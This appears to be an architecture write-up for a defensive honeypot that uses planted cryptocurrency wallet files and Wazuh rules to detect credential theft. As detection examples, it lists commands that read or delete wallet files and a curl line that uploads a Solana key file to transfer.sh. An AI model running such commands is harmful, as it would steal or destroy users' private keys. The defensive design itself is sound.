# Architecture: Crypto Wallet Honeypot

The Crypto Wallet Honeypot is a multi-layered defense-in-depth system designed to detect and alert on unauthorized access to cryptocurrency credentials. It integrates with Wazuh SIEM to provide real-time monitoring, process attribution, and automated response.

## 4-Layer Detection Strategy

The system utilizes four distinct layers of detection to catch attackers at various stages of the kill chain.

### Layer 1: File Integrity Monitoring (FIM)
**Mechanism:** Wazuh FIM (syscheck)
**Description:** This layer monitors the honeypot files themselves. Any attempt to read, modify, or delete a honeyfile triggers an immediate alert.
- **Alert Levels:** 12-14 (High to Critical)
- **Detection:** `cat ~/.bitcoin/wallet.dat`, `rm -rf ~/.ethereum/keystore`
- **MITRE ATT&CK:** T1005 (Data from Local System), T1070 (Indicator Removal), T1555 (Credentials from Password Stores)

### Layer 2: Process & Command Auditing
**Mechanism:** Linux `auditd` / Windows Sysmon
**Description:** While FIM detects *that* a file was accessed, Layer 2 identifies *how* and by *whom*. It captures the process name, user, parent process, and the exact command line used.
- **Detection:** Identifying if `find` was used to discover the files, or if a specific infostealer binary was executed.
- **Pattern Matching:** Detects "Rapid Sequential Access" (multiple wallets touched in seconds), which is characteristic of automated infostealers.
- **MITRE ATT&CK:** T1083 (File and Directory Discovery)

### Layer 3: Network Correlation
**Mechanism:** Wazuh log correlation & DNS monitoring
**Description:** Tracks network activity following a honeypot access event. If a process reads a wallet file and then initiates a connection to a "paste" site or an unknown C2 server, the severity is escalated.
- **Detection:** `curl -T ~/.solana/id.json https://transfer.sh`, or DNS queries to `pastebin.com` following a Layer 1 trigger.
- **MITRE ATT&CK:** T1041 (Exfiltration Over C2 Channel), T1048 (Exfiltration Over Alternative Protocol), T1560 (Archive Collected Data)

### Layer 4: On-Chain Monitoring
**Mechanism:** External Block Explorer Watchlists / `chain-monitor`
**Description:** The ultimate "true positive." If an attacker successfully exfiltrates a private key and imports it into a wallet to check the balance or move funds, this activity is detected on the blockchain.
- **Mechanism:** The `honeypot-deployer export-addresses` command provides the public addresses to be added to watchlists (e.g., Etherscan, Solscan).
- **MITRE ATT&CK:** T1657 (Financial Theft)

---

## MITRE ATT&CK Mapping

The following techniques are covered by the Crypto Wallet Honeypot's detection rules:

| ID | Technique | Layer |
|----|-----------|-------|
| **T1005** | Data from Local System | Layer 1 |
| **T1070** | Indicator Removal | Layer 1 |
| **T1083** | File and Directory Discovery | Layer 2 |
| **T1555** | Credentials from Password Stores | Layer 1 |
| **T1555.003** | Credentials from Web Browsers | Layer 1 |
| **T1560** | Archive Collected Data | Layer 2, 3 |
| **T1041** | Exfiltration Over C2 Channel | Layer 3 |
| **T1048** | Exfiltration Over Alternative Protocol | Layer 3 |
| **T1657** | Financial Theft | Layer 4 |

---

## Data Flow

1. **Generation:** `honeypot-deployer` creates randomized wallet artifacts and an encrypted manifest.
2. **Deployment:** Artifacts are placed on endpoints; Wazuh and audit rules are configured.
3. **Trigger:** Attacker interacts with a honeyfile.
4. **Local Alert:** `auditd`/Sysmon captures process context; Wazuh agent sends event to Manager.
5. **Manager Processing:** Wazuh Manager matches event against `honeypot_rules.xml`.
6. **Response:** Wazuh triggers alerts (Email/Slack/Dashboard) and optional Active Response (e.g., forensic snapshot or host isolation).
7. **On-Chain Alert:** If keys are used, the Chain Monitor sends a JSON event to Wazuh, triggering Layer 4 rules.
